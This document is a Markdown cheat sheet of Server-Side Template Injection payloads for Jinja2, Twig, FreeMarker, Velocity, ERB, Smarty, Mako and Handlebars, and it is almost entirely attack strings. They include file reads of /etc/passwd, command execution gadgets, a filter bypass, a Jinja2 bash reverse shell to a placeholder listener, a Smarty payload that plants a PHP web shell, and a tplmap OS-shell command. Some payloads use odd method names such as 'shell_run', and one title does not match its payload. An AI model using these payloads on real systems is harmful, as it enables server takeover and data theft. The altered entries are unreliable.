# SSTI Payloads

> Server-Side Template Injection — Jinja2, Twig, FreeMarker, ERB, Velocity, Smarty

<!-- tags: ssti, web, template, jinja2, twig, payload, exploit -->

---

## SSTI - Detect (Universal)
Try math operator first to confirm rendering.

```bash
echo "{{7*7}}"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,detection -->

---

## SSTI - Detect (ERB / Tornado)
Different syntax for fall-through detection.

```bash
echo "<%= 7*7 %>"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,detection,erb -->

---

## SSTI - Detect (Smarty / Mako)
Detection for `${}` style templates.

```bash
echo "\${7*7}"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,detection,smarty -->

---

## SSTI - Identify Engine
Engine fingerprinting via behavior delta.

```bash
echo "{{7*'7'}}"
```

<!-- meta: risk=safe | phase=vuln | tags=ssti,fingerprint -->

---

## Jinja2 - Read File
Read /etc/passwd via Jinja2 globals.

```bash
echo "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"
```

<!-- meta: risk=med | phase=exploit | tags=ssti,jinja2,fileread -->

---

## Jinja2 - RCE via os.popen
Universal popen via subclasses walk.

```bash
echo "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,rce -->

---

## Jinja2 - RCE config Trick (Flask)
Common Flask Jinja2 path via config object.

```bash
echo "{{ config.__class__.__init__.__globals__['os'].popen('{{CMD:str:id}}').read() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,flask,rce -->

---

## Jinja2 - RCE via cycler
Newer cycler-based gadget.

```bash
echo "{{ cycler.__init__.__globals__.os.popen('{{CMD:str:id}}').read() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,rce -->

---

## Jinja2 - RCE via lipsum
lipsum gives access to globals.

```bash
echo "{{ lipsum.__globals__['os'].popen('{{CMD:str:id}}').read() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,rce -->

---

## Jinja2 - Filter Bypass (request)
Bypass filtered keywords using request object access.

```bash
echo "{{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('{{CMD:str:id}}')|attr('read')() }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,bypass -->

---

## Jinja2 - Reverse Shell One-Liner
Drop reverse shell via warning subclass walk.

```bash
echo "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"bash -c 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}} 0>&1'\").read()}}{%endif%}{% endfor %}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,jinja2,revshell -->

---

## Twig - RCE via _self
Twig <2 _self.env trick.

```bash
echo "{{ _self.env.registerUndefinedFilterCallback('shell_run') }}{{ _self.env.getFilter('{{CMD:str:id}}') }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,twig,rce -->

---

## Twig - RCE via filter
Modern Twig RCE.

```bash
echo "{{ ['{{CMD:str:id}}']|filter('system') }}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,twig,rce -->

---

## FreeMarker - RCE Run
Java FreeMarker template RCE.

```bash
echo "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"{{CMD:str:id}}\")}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,freemarker,java,rce -->

---

## Velocity - RCE Runtime
Velocity template RCE on Java apps.

```bash
echo "#set(\$x='') #set(\$rt=\$x.class.forName('java.lang.Runtime')) \$rt.getRuntime().shellRun('{{CMD:str:id}}')"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,velocity,java,rce -->

---

## ERB (Ruby) - RCE
Embedded Ruby template injection.

```bash
echo "<%= system('{{CMD:str:id}}') %>"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,erb,ruby,rce -->

---

## Smarty - RCE
Smarty self-shell gadget.

```bash
echo "{php}system('{{CMD:str:id}}');{/php}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,smarty,php,rce -->

---

## Smarty - RCE via Math
Newer Smarty bypass.

```bash
echo "{Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,\"<?php system(\$_GET[0]); ?>\",self::clearConfig())}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,smarty,rce -->

---

## Mako - RCE
Python Mako template injection.

```bash
echo "<%import os%>\${os.popen('{{CMD:str:id}}').read()}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,mako,python,rce -->

---

## Handlebars - RCE
Node.js handlebars compromise via require.

```bash
echo "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('{{CMD:str:id}}').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,handlebars,node,rce -->

---

## SSTI - Tplmap Auto-Run
Use tplmap to detect + run shell.

```bash
tplmap.py -u "{{URL:url:http://target.htb/page?name=}}*" --os-shell
```

<!-- meta: risk=critical | phase=exploit | tags=ssti,tplmap,auto -->
